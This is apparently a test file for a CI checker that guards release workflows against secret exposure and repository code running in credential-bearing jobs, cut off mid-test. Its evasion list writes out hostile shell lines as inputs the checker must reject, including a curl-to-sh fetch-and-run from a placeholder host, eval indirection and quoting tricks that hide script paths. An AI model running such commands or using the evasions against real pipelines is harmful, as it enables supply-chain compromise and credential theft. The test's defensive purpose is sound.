import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";

import { parse } from "yaml";

import {
	CREDENTIAL_JOBS,
	PRODUCTION_POINTERS,
	R2_WRITERS,
	TEST_SIGNER_FLAG,
	TEST_SIGNER_STEP,
	artifactDirectoriesOf,
	checkWorkflows,
	credentialStepReasons,
	isCredentialBearing,
	r2StepReasons,
	referencesSecret,
	repositoryCodeReasons,
	shellCommands,
	splitWords,
} from "../check-release-workflow.mjs";

const RELEASE = ".github/workflows/build-binaries.yml";
const STANDALONE = ".github/workflows/standalone-binaries.yml";

function reader(overrides = {}) {
	return (path) => overrides[path] ?? readFileSync(path, "utf8");
}

function mutate(path, mutateText) {
	const original = readFileSync(path, "utf8");
	const mutated = mutateText(original);
	assert.notEqual(mutated, original, "the mutation did not change the workflow; the anchor text moved");
	return mutated;
}

/** Appends a `run` step to the named job (which must already have at least one step). */
function appendStep(text, jobId, stepYaml) {
	const document = parse(text);
	const job = document.jobs[jobId];
	assert.ok(job, `job ${jobId} exists`);
	const lastStep = job.steps[job.steps.length - 1];
	const nextJob = Object.keys(document.jobs)[Object.keys(document.jobs).indexOf(jobId) + 1];
	const anchor = nextJob ? `\n  ${nextJob}:\n` : null;
	const insertAt = anchor ? text.indexOf(anchor) : text.length;
	assert.ok(insertAt > 0, `found the end of job ${jobId} (${lastStep.name})`);
	return `${text.slice(0, insertAt)}\n${stepYaml}${text.slice(insertAt)}`;
}

function runStep(name, script) {
	const body = script
		.split("\n")
		.map((line) => `          ${line}`)
		.join("\n");
	return `      - name: ${name}\n        run: |\n${body}\n`;
}

test("the checked-in workflows satisfy every invariant", () => {
	assert.deepEqual(checkWorkflows(), []);
});

test("every job that publishes holds its credential in a protected environment", () => {
	const release = parse(readFileSync(RELEASE, "utf8"));
	for (const jobId of CREDENTIAL_JOBS) {
		assert.ok(release.jobs[jobId], `${jobId} exists`);
		assert.ok(release.jobs[jobId].environment, `${jobId} runs in an environment`);
		assert.ok(isCredentialBearing(release.jobs[jobId]), `${jobId} is recognised as credential-bearing`);
	}
	// A contents:write GITHUB_TOKEN can push tags and publish releases: it is a credential.
	assert.ok(isCredentialBearing(release.jobs["github-release"]));
	assert.ok(isCredentialBearing(release.jobs["github-release-beta"]));
	// OIDC minting is a credential too.
	assert.ok(isCredentialBearing(release.jobs.sign));
	// Jobs that run repository code hold nothing.
	for (const jobId of ["build", "assemble", "validate-macos", "pack-npm", "context", "verify"]) {
		assert.equal(isCredentialBearing(release.jobs[jobId]), false, `${jobId} holds no credential`);
	}
});

test("GITHUB_TOKEN never masks another secret in the same job (finding A)", () => {
	// A job that reads R2_SECRET_ACCESS_KEY is credential-bearing no matter what else it references.
	const both = {
		permissions: { contents: "read" },
		steps: [
			{
				name: "Upload",
				env: { GH_TOKEN: "${{ secrets.GITHUB_TOKEN }}", AWS_SECRET_ACCESS_KEY: "${{ secrets.R2_SECRET_ACCESS_KEY }}" },
				run: "aws s3 cp x s3://y",
			},
		],
	};
	assert.equal(isCredentialBearing(both), true);
	// The same two references in ONE value.
	assert.equal(
		isCredentialBearing({ permissions: {}, env: { TOKENS: "${{ secrets.GITHUB_TOKEN }} ${{ secrets.R2_SECRET_ACCESS_KEY }}" }, steps: [] }),
		true,
	);
	// Only GITHUB_TOKEN, in any number of places, is not a credential.
	assert.equal(
		isCredentialBearing({
			permissions: { contents: "read" },
			env: { GH_TOKEN: "${{ secrets.GITHUB_TOKEN }}" },
			steps: [{ env: { GITHUB_TOKEN: "${{ secrets.GITHUB_TOKEN }}" }, run: "gh api x" }],
		}),
		false,
	);
	// Secrets reach a job through more than `env:`.
	for (const job of [
		{ permissions: {}, steps: [{ uses: "some/action@0000000000000000000000000000000000000000", with: { token: "${{ secrets.NPM_TOKEN }}" } }] },
		{ permissions: {}, steps: [{ run: 'echo "${{ secrets.R2_BUCKET }}"' }] },
		{ permissions: {}, steps: [{ run: "echo ${{ toJSON(secrets) }}" }] },
		{ permissions: {}, steps: [{ run: "echo ${{ secrets['R2_BUCKET'] }}" }] },
		{ permissions: {}, steps: [{ run: "echo ${{ secrets.GITHUB_TOKEN_BACKUP }}" }] },
		{ permissions: {}, if: "secrets.DEPLOY_KEY != ''", steps: [] },
		{ permissions: {}, steps: [{ if: "secrets.DEPLOY_KEY != ''", run: "true" }] },
	]) {
		assert.equal(isCredentialBearing(job), true, JSON.stringify(job));
	}
	assert.equal(referencesSecret("${{ secrets.GITHUB_TOKEN }}"), false);
	assert.equal(referencesSecret("${{ secrets.GITHUB_TOKEN }} ${{ secrets.OTHER }}"), true);
	assert.equal(referencesSecret("${{ secrets.OTHER }} ${{ secrets.GITHUB_TOKEN }}"), true);
	assert.equal(referencesSecret("${{ secrets.GITHUB_TOKEN2 }}"), true);
	assert.equal(referencesSecret("${{ secrets.GITHUB_TOKENX }}"), true);
});

test("a job with both GITHUB_TOKEN and an R2 secret is classified credential-bearing and its checkout is flagged (finding A)", () => {
	// Take `build` - an unprivileged job that legitimately checks out - and give it an R2 secret next
	// to GITHUB_TOKEN in a step env. Before the fix GITHUB_TOKEN's presence exempted the whole value.
	const broken = mutate(RELEASE, (text) =>
		appendStep(
			text,
			"build",
			"      - name: Upload with both tokens\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.R2_SECRET_ACCESS_KEY }}\n        run: aws s3 cp x s3://y\n",
		),
	);
	const release = parse(broken);
	assert.equal(isCredentialBearing(release.jobs.build), true);
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(
		problems.some((problem) => problem.includes("'build'") && problem.includes("actions/checkout")),
		problems.join("\n"),
	);
	// The same secret pair as ONE job-level env value is rejected as a job-level secret too.
	const jobLevel = mutate(RELEASE, (text) =>
		text.replace(
			"    env:\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n    steps:\n      # No checkout, no dependency install",
			"    env:\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n      TOKENS: ${{ secrets.GITHUB_TOKEN }} ${{ secrets.R2_ACCESS_KEY_ID }}\n    steps:\n      # No checkout, no dependency install",
		),
	);
	assert.ok(checkWorkflows(reader({ [RELEASE]: jobLevel })).some((problem) => problem.includes("exposes TOKENS")));
});

test("a tag trigger is rejected", () => {
	const broken = mutate(RELEASE, (text) => text.replace("  push:\n    branches:\n      - main\n", "  push:\n    branches:\n      - main\n    tags:\n      - 'v*'\n"));
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("tag push")));
});

test("a wide workflow token is rejected", () => {
	const broken = mutate(RELEASE, (text) => text.replace("permissions: {}", "permissions:\n  contents: write"));
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("permissions: {}")));
});

test("a job-level R2 secret is rejected", () => {
	const broken = mutate(RELEASE, (text) =>
		text.replace(
			"    env:\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n    steps:\n      # No checkout, no dependency install",
			"    env:\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n      AWS_ACCESS_KEY_ID: ${{ secrets.R2_ACCESS_KEY_ID }}\n    steps:\n      # No checkout, no dependency install",
		),
	);
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("exposes AWS_ACCESS_KEY_ID")));
});

const CHECKOUT_STEP = "      - name: Sneak in a checkout\n        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0\n";
const SETUP_NODE_STEP = "      - name: Sneak in a toolchain\n        uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0\n";

for (const jobId of ["publish-r2", "finalize-release", "publish-beta-r2", "publish-npm", "tap-bump", "github-release"]) {
	test(`actions/checkout inside credential-bearing job ${jobId} is rejected`, () => {
		const broken = mutate(RELEASE, (text) => appendStep(text, jobId, CHECKOUT_STEP));
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(
			problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes("actions/checkout")),
			problems.join("\n"),
		);
	});
}

test("actions/setup-node is rejected in R2 jobs but allowed for npm trusted publishing", () => {
	const broken = mutate(RELEASE, (text) => appendStep(text, "finalize-release", SETUP_NODE_STEP));
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("'finalize-release'") && problem.includes("setup-node")));
	const release = parse(readFileSync(RELEASE, "utf8"));
	assert.ok(release.jobs["publish-npm"].steps.some((step) => step.uses?.startsWith("actions/setup-node@")));
	assert.deepEqual(checkWorkflows(), []);
});

const EVASIONS = [
	["node scripts/x.mjs", "node scripts/pack-npm-packages.mjs --out-dir npm-packages"],
	["bash scripts/x.sh", "bash scripts/publish.sh"],
	["sh with a relative script", "sh ./publish.sh"],
	["./scripts/x.sh in command position", "./scripts/publish.sh --yes"],
	["python3 scripts/x.py", "python3 scripts/publish.py"],
	["source scripts/x", "source scripts/env.sh"],
	[". scripts/x", ". scripts/env.sh"],
	["a script under packages/", "node packages/coding-agent/scripts/publish.mjs"],
	["a script under .github/", "bash .github/scripts/publish.sh"],
	["$GITHUB_WORKSPACE/scripts", 'bash "$GITHUB_WORKSPACE/scripts/publish.sh"'],
	["${GITHUB_WORKSPACE}/packages", 'node "${GITHUB_WORKSPACE}/packages/coding-agent/dist/cli.js"'],
	["an interpreter after a pipe", 'echo hi | node scripts/publish.mjs'],
	["an interpreter after &&", 'test -f x && node scripts/publish.mjs'],
	["a continued line", 'node \\\n  scripts/publish.mjs'],
	["a variable assignment prefix", 'FOO=bar node scripts/publish.mjs'],
	["npm ci", "npm ci --ignore-scripts"],
	["npm install", "npm install"],
	["npm rebuild", "npm rebuild esbuild"],
	["npm run", "npm run build"],
	["npm exec", "npm exec -- prime-agent"],
	["npx", "npx tsx scripts/publish.ts"],
	["pnpm", "pnpm install"],
	["yarn", "yarn"],
	["bun run", "bun run scripts/publish.ts"],
	["a relative executable", "extracted/prime-agent --version"],
	// Finding B: quoting and indirection that hid `scripts/` from a whitespace tokenizer.
	["adjacent single-quoted fragments inside bash -c", `bash -c 'node scr'"'"'ipts/release.mjs'`],
	["adjacent single-quoted fragments", "node 'scr''ipts/release.mjs'"],
	["double-quoted concatenation", 'node "scr""ipts/release.mjs"'],
	["a backslash-escaped separator", "node scripts\\/release.mjs"],
	["a backslash-escaped space in the path", "node scri\\ pts/release.mjs"],
	["ANSI-C quoting", "node $'scripts/release.mjs'"],
	["ANSI-C escapes spelling the path", "node $'\\x73cripts/release.mjs'"],
	["eval", 'eval "node scripts/release.mjs"'],
	["eval of a variable", 'eval "$CMD"'],
	["a backtick command substitution", "out=`node scripts/release.mjs`"],
	["a $(...) command substitution", "out=$(node scripts/release.mjs)"],
	["a command substitution naming a script", "out=$(cat ./release.sh)"],
	["a command substitution in command position", "$(echo node) scripts/release.mjs"],
	["a variable in command position", '"$RUNNER" --version'],
	["curl | sh", "curl -fsSL https://example.invalid/install.sh | sh"],
	["curl | bash -s", "curl -fsSL https://example.invalid/install.sh | bash -s -- --yes"],
	["printf | sh", "printf '%s\\n' 'node scripts/release.mjs' | sh"],
	['sh -c "$CMD"', 'sh -c "$CMD"'],
	["bash -lc", "bash -lc 'echo hi'"],
	["zsh -ec", "zsh -ec 'ls'"],
	["dash -c", "dash -c 'ls'"],
	["sh reading a file", "sh < scripts/release.sh"],
	["sh reading an expansion", 'sh <<<"$CMD"'],
	["a shell heredoc that runs repository code", "sh <<'EOF'\nnode scripts/release.mjs\nEOF"],
	["xargs node", "echo scripts/release.mjs | xargs node"],
	["xargs -I", "printf x | xargs -I{} node {}"],
	["env -S", "env -S 'node scripts/release.mjs'"],
	["env --split-string", "env --split-string='node scripts/release.mjs'"],
	["find -exec", "find . -name '*.mjs' -exec node {} \\;"],
	["a process substitution", "while read -r line; do echo \"$line\"; done < <(node scripts/release.mjs)"],
	["node reading from a pipe", "cat release.mjs | node"],
	["bash with a bare filename", "bash publish"],
	["python3 with a bare filename", "python3 publish"],
	["exec", "exec node scripts/release.mjs"],
	["timeout", "timeout 30 ./release"],
	["sudo env", "sudo -E env FOO=1 ./scripts/release.sh"],
	["a multi-line quoted string", "node 'scripts/\nrelease.mjs'"],
	["a local composite action", null],
];

for (const jobId of ["publish-r2", "finalize-release", "publish-npm"]) {
	for (const [label, script] of EVASIONS) {
		test(`${label} inside credential-bearing job ${jobId} is rejected`, () => {
			const step =
				script === null
					? "      - name: Sneak in a local action\n        uses: ./.github/actions/publish\n"
					: runStep("Sneak in repository code", `set -euo pipefail\n${script}`);
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, step));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(
				problems.some((problem) => problem.includes(`'${jobId}'`) && /must not run repository code|local action/.test(problem)),
				`expected a repository-code finding for ${jobId}, got:\n${problems.join("\n")}`,
			);
		});
	}
}

test("the shell matcher understands continuations, heredocs, pipes and comments", () => {
	const commands = [
		...shellCommands(
			"digest=$(grep -E 'x' \\\n  \"$GITHUB_WORKSPACE/artifacts/SHA256SUMS\" | cut -d' ' -f1)\npython3 - \"$formula\" <<'PY'\nimport scripts/evil\nPY\n# node scripts/comment.mjs\necho ok # node scripts/comment.mjs\n",
		),
	];
	assert.deepEqual(
		commands.map((command) => command.words.map((word) => word.text)),
		[["digest=$(grep -E 'x'    \"$GITHUB_WORKSPACE/artifacts/SHA256SUMS\" | cut -d' ' -f1)"], ["python3", "-", "$formula"], ["echo", "ok"]],
	);
	assert.deepEqual(commands[0].substitutions, ["grep -E 'x'    \"$GITHUB_WORKSPACE/artifacts/SHA256SUMS\" | cut -d' ' -f1"]);
	for (const command of commands) assert.deepEqual(repositoryCodeReasons(command), [], command.words.map((word) => word.text).join(" "));
});

test("word splitting resolves adjacent quoted fragments the way a POSIX shell does (finding B)", () => {
	const words = (line) => splitWords(line).commands.map((command) => command.words.map((word) => word.text));
	assert.deepEqual(words(`bash -c 'node scr'"'"'ipts/release.mjs'`), [["bash", "-c", "node scr'ipts/release.mjs"]]);
	assert.deepEqual(words(`node 'scr''ipts/x.mjs'`), [["node", "scripts/x.mjs"]]);
	assert.deepEqual(words(`node "scr""ipts/x.mjs"`), [["node", "scripts/x.mjs"]]);
	assert.deepEqual(words(`node scr\\ipts/x.mjs`), [["node", "scripts/x.mjs"]]);
	assert.deepEqual(words(`node scri\\ pts/x.mjs`), [["node", "scri pts/x.mjs"]]);
	assert.deepEqual(words(`node $'scripts/x.mjs'`), [["node", "scripts/x.mjs"]]);
	assert.deepEqual(words(`node $'\\x73cripts/\\146.mjs'`), [["node", "scripts/f.mjs"]]);
	assert.deepEqual(words(`echo "a \\"b\\" \\$c" 'd $e' f\\ g`), [["echo", 'a "b" $c', "d $e", "f g"]]);
	// Separators, comments and redirections.
	assert.deepEqual(words("a; b && c || d | e & f"), [["a"], ["b"], ["c"], ["d"], ["e"], ["f"]]);
	assert.deepEqual(words("a # b c"), [["a"]]);
	assert.deepEqual(words("a '#' b"), [["a", "#", "b"]]);
	assert.deepEqual(words('a > out 2>&1 <<<"x" >>log'), [["a"]]);
	assert.deepEqual(words("names+=(\"$name\") x"), [['names+=("$name")', "x"]]);
	assert.deepEqual(words("case \"$1\" in *.sh) echo a ;; esac"), [["case", "$1", "in", "*.sh"], ["echo", "a"], ["esac"]]);
	// Expansions are recorded, and substitutions are surfaced for inspection.
	const [sub] = splitWords("x=$(a | b) `c` <(d) \"$(e)\" $((1 + 2))").commands;
	assert.deepEqual(sub.substitutions, ["a | b", "c", "d", "e"]);
	assert.deepEqual(
		sub.words.map((word) => word.expansion),
		[true, true, true, true, true],
	);
	assert.deepEqual(splitWords("foo | sh").commands.map((command) => command.piped), [false, true]);
	assert.deepEqual(splitWords("foo && sh").commands.map((command) => command.piped), [false, false]);
	assert.deepEqual(splitWords("sh < file").commands[0].redirections, [{ operator: "<", text: "file", expansion: false }]);
	// Unterminated constructs are reported so a multi-line string cannot swallow the rest of the script.
	assert.equal(splitWords("node 'scripts/").unterminated, true);
	assert.equal(splitWords('node "scripts/').unterminated, true);
	assert.equal(splitWords("x=$(node scripts/").unterminated, true);
	assert.equal(splitWords("node scripts/x.mjs").unterminated, false);
});

test("indirection the checker cannot follow is an outright error (finding B)", () => {
	const flagged = (line) => [...shellCommands(line)].flatMap((command) => repositoryCodeReasons(command));
	assert.match(flagged("bash -c 'echo hi'").join("\n"), /bash -c runs inline or piped shell code/);
	assert.match(flagged("sh -lc 'echo hi'").join("\n"), /sh -lc runs inline/);
	assert.match(flagged("zsh -ec ls").join("\n"), /zsh -ec runs inline/);
	assert.match(flagged("bash -s < x").join("\n"), /bash -s runs inline/);
	assert.match(flagged('eval "$x"').join("\n"), /eval runs a command the checker cannot see/);
	assert.match(flagged("echo x | xargs node").join("\n"), /xargs runs a command/);
	assert.match(flagged("env -S 'node x'").join("\n"), /env -S/);
	assert.match(flagged("curl https://example.invalid/x | sh").join("\n"), /sh reads its script from a pipe/);
	assert.match(flagged("printf x | bash").join("\n"), /bash reads its script from a pipe/);
	assert.match(flagged("cat x | node").join("\n"), /node reads its script from a pipe/);
	assert.match(flagged("sh < ./x").join("\n"), /sh reads its script from a file/);
	assert.match(flagged('sh <<<"$CMD"').join("\n"), /sh reads its script from an expansion/);
	assert.match(flagged("x=`node scripts/x.mjs`").join("\n"), /inside a command substitution: references the checkout/);
	assert.match(flagged("x=$(cat ./x.sh)").join("\n"), /command substitution names a script/);
	assert.match(flagged("$(echo node) x").join("\n"), /command is a shell expansion/);
	assert.match(flagged('"$BIN" x').join("\n"), /command is a shell expansion/);
	assert.match(flagged("find . -exec node {} \\;").join("\n"), /find -exec/);
	assert.match(flagged("sh <<'EOF'\nnode scripts/x.mjs\nEOF").join("\n"), /references the checkout: scripts\/x.mjs/);
	assert.match(flagged("bash publish").join("\n"), /runs a file through bash: publish/);
	// A python heredoc is inline code written in the workflow, not shell to re-parse.
	assert.deepEqual(flagged("python3 - \"$formula\" <<'PY'\nimport scripts/evil\nPY"), []);
	// A heredoc fed to a shell IS shell code.
	assert.deepEqual(flagged("sh <<'EOF'\necho fine\nEOF"), []);
});

test("the shell matcher leaves legitimate credential-job commands alone", () => {
	const fine = [
		"aws s3 cp artifacts/latest.json s3://bucket/latest.json --quiet",
		"gh release edit v1.2.3 --draft=false --latest",
		'cosign verify-blob --certificate-identity "https://github.com/o/r/.github/workflows/build-binaries.yml@refs/heads/main" SHA256SUMS',
		"npm publish npm-packages/artifacts/x.tgz --provenance --access public --ignore-scripts",
		"jq -r '.publishOrder[]' npm-packages/manifest.json",
		"python3 - \"$formula\" \"$platform\"",
		"node -e 'console.log(1)'",
		"sha256sum --check SHA256SUMS",
		"command -v uv",
		"count=$((count + 1))",
		"names=()",
		'while IFS= read -r name; do names+=("$name"); done < <(jq -r \'.publishOrder[]\' npm-packages/manifest.json)',
		'test "$(jq -r .isDraft /tmp/release.json)" = true',
		'echo "Draft ${TAG} targets ${BUILD_REF}; $(jq length /tmp/current-assets.json) assets unchanged."',
		'if [[ "$BUILD_REF" =~ ^[0-9a-f]{40}$ ]]; then echo ok; fi',
		'case "$name" in *.tar.gz) echo archive ;; esac',
		'local_digest="sha256:$(sha256sum "artifacts/$name" | cut -d\' \' -f1)"',
		"printf 'Automated beta build from `%s` (`%s`).\\n' \"$DEFAULT_BRANCH\" \"$BUILD_REF\" > /tmp/beta-release-notes.md",
		"gh release create \"$TAG\" --draft --notes-file /tmp/notes.md artifacts/*",
		"test -f artifacts/install.sh",
		"grep -E 'x' \"$GITHUB_WORKSPACE/artifacts/SHA256SUMS\"",
		"/usr/bin/env true",
	];
	for (const line of fine) {
		for (const tokens of shellCommands(line)) assert.deepEqual(repositoryCodeReasons(tokens), [], line);
	}
});

test("the pointers may only move in finalize-release, after the release is published", () => {
	// publish-r2 moving stable is exactly the ordering bug this file exists to prevent.
	const broken = mutate(RELEASE, (text) =>
		appendStep(text, "publish-r2", runStep("Advance early", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable" --quiet')),
	);
	let problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("only 'finalize-release' may write a production pointer")));

	const beta = mutate(RELEASE, (text) =>
		text.replace(
			'          aws s3 cp artifacts/beta "s3://${R2_BUCKET}/beta" \\',
			'          aws s3 cp artifacts/install.sh "s3://${R2_BUCKET}/install.sh"\n          aws s3 cp artifacts/beta "s3://${R2_BUCKET}/beta" \\',
		),
	);
	problems = checkWorkflows(reader({ [RELEASE]: beta }));
	assert.ok(problems.some((problem) => problem.includes("beta channel must never write a production pointer")));

	// A step after the pointer step in finalize-release is rejected: pointers move last.
	const late = mutate(RELEASE, (text) => appendStep(text, "finalize-release", runStep("Afterthought", "echo done")));
	problems = checkWorkflows(reader({ [RELEASE]: late }));
	assert.ok(problems.some((problem) => problem.includes("in its last step")));

	// Moving the pointers before the release is undrafted is rejected.
	const early = mutate(RELEASE, (text) =>
		text.replace(
			"      - name: Publish the release and prove the tag points at BUILD_REF\n",
			`${runStep("Advance first", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable" --quiet')}\n      - name: Publish the release and prove the tag points at BUILD_REF\n`,
		),
	);
	problems = checkWorkflows(reader({ [RELEASE]: early }));
	assert.ok(problems.some((problem) => problem.includes("must publish the GitHub release before it moves the channel pointers")), problems.join("\n"));
	assert.ok(problems.some((problem) => problem.includes("'finalize-release' must advance the channel pointers in its last step")), problems.join("\n"));

	// Dropping one pointer from the last step is rejected: all four move together.
	const partial = mutate(RELEASE, (text) => text.replace('          aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable" \\\n', '          aws s3 cp artifacts/stable "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/stable" \\\n'));
	problems = checkWorkflows(reader({ [RELEASE]: partial }));
	assert.ok(problems.some((problem) => problem.includes("missing: stable")), problems.join("\n"));
	assert.ok(problems.some((problem) => problem.includes("outside the allowlist for 'finalize-release'")), problems.join("\n"));
});

test("the publication order is enforced: github-release -> publish-r2 -> verify -> finalize-release -> npm/tap", () => {
	for (const [later, earlier, replacement] of [
		["verify", "publish-r2", "needs: [context, github-release]"],
		["finalize-release", "verify", "needs: [context, publish-r2]"],
		["publish-npm", "finalize-release", "needs: [context, pack-npm]"],
		["tap-bump", "finalize-release", "needs: [context, verify]"],
	]) {
		const release = parse(readFileSync(RELEASE, "utf8"));
		const current = `needs: [${release.jobs[later].needs.join(", ")}]`;
		const broken = mutate(RELEASE, (text) => {
			const start = text.indexOf(`\n  ${later}:\n`);
			const index = text.indexOf(current, start);
			assert.ok(index > start, `${later} declares ${current}`);
			return `${text.slice(0, index)}${replacement}${text.slice(index + current.length)}`;
		});
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(
			problems.some((problem) => problem.includes(`'${later}' must need '${earlier}'`)),
			`${later} without ${earlier}:\n${problems.join("\n")}`,
		);
	}
});

test("a credential job outside a protected environment is rejected", () => {
	const broken = mutate(RELEASE, (text) =>
		text.replace(
			"    environment:\n      name: release-npm\n",
			"",
		),
	);
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("'publish-npm' must run in a protected environment")));
});

test("npm ci without --ignore-scripts is rejected", () => {
	const broken = mutate(STANDALONE, (text) => text.replace("npm ci --ignore-scripts", "npm ci"));
	const problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("--ignore-scripts")));
});

test("an unpinned action is rejected", () => {
	const broken = mutate(STANDALONE, (text) =>
		text.replace("oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2", "oven-sh/setup-bun@v2"),
	);
	const problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("without a full commit SHA")));
});

test("the test signer override may be compiled in exactly one standalone step and never uploaded (finding C)", () => {
	const RELEASE_TRUST = "packages/coding-agent/src/utils/release-trust.ts";
	assert.equal(TEST_SIGNER_STEP.workflow, STANDALONE);
	const standalone = parse(readFileSync(STANDALONE, "utf8"));
	const compile = standalone.jobs[TEST_SIGNER_STEP.job].steps.find((step) => step.name === TEST_SIGNER_STEP.step);
	assert.ok(compile.run.includes(TEST_SIGNER_FLAG), "the designated step compiles with the flag");

	// The flag anywhere else - the release compile, another job, an env value - is rejected.
	let broken = mutate(STANDALONE, (text) => text.replace("run: npm run build:binary", `run: npm run build:binary -- ${TEST_SIGNER_FLAG} signer.json`));
	let problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes(TEST_SIGNER_FLAG) && problem.includes("'Compile standalone application'")), problems.join("\n"));
	broken = mutate(RELEASE, (text) => appendStep(text, "build", runStep("Sneak a test signer in", `node packages/coding-agent/scripts/build-binary.mjs ${TEST_SIGNER_FLAG} x.json`)));
	problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes(TEST_SIGNER_FLAG) && problem.includes("'build'")), problems.join("\n"));
	// So is defining the identifier by hand.
	broken = mutate(RELEASE, (text) => appendStep(text, "build", runStep("Define it directly", "bun build --define __PRIME_AGENT_RELEASE_SIGNER_OVERRIDE__='\"{}\"' x")));
	problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("__PRIME_AGENT_RELEASE_SIGNER_OVERRIDE__")), problems.join("\n"));
	// Renaming the designated step turns its own flag into a violation.
	broken = mutate(STANDALONE, (text) => text.replace(`name: ${TEST_SIGNER_STEP.step}`, "name: Compile another binary"));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes(TEST_SIGNER_FLAG)), problems.join("\n"));

	// The uploaded artifact must not reach into the test-signer directories or a whole tree.
	for (const extra of ["${{ runner.temp }}/test-release/current/*.tar.gz", "${{ runner.temp }}/**", "${{ runner.temp }}/", "source/packages/coding-agent/binaries-test-signer/"]) {
		broken = mutate(STANDALONE, (text) => text.replace("            ${{ runner.temp }}/standalone/binaries.json\n", `            \${{ runner.temp }}/standalone/binaries.json\n            ${extra}\n`));
		problems = checkWorkflows(reader({ [STANDALONE]: broken }));
		assert.ok(problems.some((problem) => /test-signer|directory tree/.test(problem)), `${extra}:\n${problems.join("\n")}`);
	}
	// The test build must stay under $RUNNER_TEMP/test-release.
	broken = mutate(STANDALONE, (text) => text.replace(`"$RUNNER_TEMP/test-release/next" 99.0.0`, `"$RUNNER_TEMP/standalone" 99.0.0`));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("under $RUNNER_TEMP/test-release")), problems.join("\n"));
	broken = mutate(STANDALONE, (text) => text.replace(`${TEST_SIGNER_FLAG} "$RUNNER_TEMP/test-release/signer.json"`, `${TEST_SIGNER_FLAG} signer.json`));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("signer JSON from under $RUNNER_TEMP/test-release")), problems.join("\n"));
	// ...and be compiled only after the release archive has been assembled.
	broken = mutate(STANDALONE, (text) => {
		const start = text.indexOf("      - name: Assemble native archive\n");
		const end = text.indexOf("      - name: Resolve the signer identity of this job\n");
		const assemble = text.slice(start, end);
		const anchor = "      - name: Remove the build paths from the test machine\n";
		return `${text.slice(0, start)}${text.slice(end).replace(anchor, `${assemble}${anchor}`)}`;
	});
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("must be assembled before")), problems.join("\n"));

	// The standalone job may hold id-token:write ONLY because the updater pins a different workflow path.
	const trust = readFileSync(RELEASE_TRUST, "utf8");
	broken = trust.replace('RELEASE_SIGNER_WORKFLOW_PATH = ".github/workflows/build-binaries.yml"', 'RELEASE_SIGNER_WORKFLOW_PATH = ".github/workflows/standalone-binaries.yml"');
	assert.notEqual(broken, trust);
	problems = checkWorkflows(reader({ [RELEASE_TRUST]: broken }));
	assert.ok(problems.some((problem) => problem.includes("RELEASE_SIGNER_WORKFLOW_PATH must pin")), problems.join("\n"));
	// ...and nothing else may be granted next to repository code, in the called or the calling job.
	broken = mutate(STANDALONE, (text) => text.replace("      contents: read\n      id-token: write\n", "      contents: write\n      id-token: write\n"));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("holds 'contents: write'")), problems.join("\n"));
	broken = mutate(STANDALONE, (text) => text.replace("      contents: read\n      id-token: write\n", "      contents: read\n      id-token: write\n      attestations: write\n"));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("holds 'attestations: write'")), problems.join("\n"));
	broken = mutate(STANDALONE, (text) => text.replace("    env:\n      # A pull request from a fork", "    environment: release-r2\n    env:\n      # A pull request from a fork"));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("must not run in an environment")), problems.join("\n"));
	broken = mutate(STANDALONE, (text) => text.replace("      TARGET_PLATFORM: ${{ matrix.platform }}\n", "      TARGET_PLATFORM: ${{ matrix.platform }}\n      R2: ${{ secrets.R2_BUCKET }}\n"));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("references a secret")), problems.join("\n"));
	broken = mutate(RELEASE, (text) => text.replace("    permissions:\n      contents: read\n      id-token: write\n    uses: ./.github/workflows/standalone-binaries.yml", "    permissions:\n      contents: write\n      id-token: write\n    uses: ./.github/workflows/standalone-binaries.yml"));
